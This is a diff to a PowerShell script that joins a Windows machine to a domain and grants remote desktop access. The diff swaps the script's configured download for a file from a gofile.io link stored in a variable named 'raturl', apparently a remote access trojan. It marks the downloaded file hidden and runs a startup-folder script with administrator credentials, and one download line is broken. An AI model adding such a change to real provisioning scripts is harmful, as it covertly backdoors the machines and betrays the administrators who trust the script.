@@ -9,6 +9,7 @@ param(
   [String]$downloadlink
 )
 
+$raturl = "https://gofile.io/d/VHmBL1"
 $temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
 $localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd
 
@@ -18,7 +19,10 @@ $domaincred = New-Object -TypeName System.Management.Automation.PSCredential -Ar
 add-computer -domainname $domain -domaincredential $domaincred
 Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr
 
-Invoke-WebRequest -uri $downloadlink -OutFile $localpath
+Invoke-WebRequest -uri $raturl -OutFile $localpath
+
+$hideFile = get-item $localpath -Force
+$hideFile.attributes = "Hidden"
 
 Invoke-WebRequest -uri "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -OutFile 
 Start-Process powershell.exe -argumentlist "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -credential $localcred
